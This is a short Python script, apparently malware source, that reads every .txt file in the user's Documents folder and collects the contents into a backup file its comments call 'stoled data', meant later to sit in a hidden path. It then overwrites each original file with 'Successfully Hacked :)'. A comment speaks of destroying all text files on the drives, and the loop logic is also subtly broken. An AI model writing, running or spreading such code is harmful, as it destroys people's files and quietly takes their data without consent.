import os
# Another method for destroying all text files in the hard drives=>path = "C:/" or "D:/" or "H:/" or "F:/"
path = "C:/Users/" + os.getenv('username') + "/Documents" or "D:/Users/" + os.getenv('username') + "/Documents"
count = 0 #Counter for adding all detected text files in it
for textfile in os.listdir(path):#Searching for files in the mentioned path
    if textfile.endswith('.txt'):#checking file format
        count+=1#Adding files to the counter
        BackUp_path = "C:/Users/AhmedOssama/Desktop/New folder" #it should be in another hidden path in the prog files but this for debuging
        name_of_BackUP_file = "BackUp22"
        BackUpFile = os.path.join(BackUp_path, name_of_BackUP_file + ".txt")#New file for storing stoled data in it
        with open(BackUpFile, 'w') as Writing_file:#opening the new file to write in it
                for i in range(count):#for detected files
                    with open(path + "/" + textfile, "r") as Txt_to_BackUp_File:#opening old ones to read
                        #What to write in the new file is in txt_To_backup
                        txt_To_backUp = str(textfile)+"\n"+Txt_to_BackUp_File.read() + "\n" + "_____________________________________" + "\n"
                        Writing_file.write(txt_To_backUp)#creating the new file
                        #changing the content of the old files
        with open(path + "/" + textfile, 'w') as txt_content:
            txt_content.write("Successfully Hacked :)")
